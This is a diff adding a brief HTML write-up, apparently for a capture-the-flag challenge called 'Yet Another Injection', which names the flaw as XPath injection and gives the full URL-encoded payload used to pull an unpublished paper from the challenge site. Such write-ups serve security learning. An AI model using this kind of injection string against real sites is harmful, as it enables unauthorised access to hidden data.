@@ -1,0 +1,4 @@
+<h1>Yet Another Injection</h1>
+
+<p>It was was XPATH injection. Just needed to find a paper that was unpublished like this:
+<code>http://yai.sstf.site/paperdetail.php?idx=32%27%20and%20@published=%27no%27%20or%20%27a%27=%27b</code>.</p>
